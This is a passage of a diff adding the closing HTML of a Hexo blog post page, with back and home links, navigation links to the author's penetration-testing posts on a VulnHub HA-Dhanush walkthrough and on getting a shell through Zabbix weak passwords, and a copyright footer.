+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/01/HA-Dhanush/">VulnHub通关日记-HA-Dhanush，一次通过SSH爆破艰难的更换SSH用户,最后使用ZIP提权拿到Root权限</a>
+            
+            
+            <a class="next" rel="next" href="/2019/11/29/penetrationtest-8/">Zabbix-弱口令再到命令执行Getshell</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
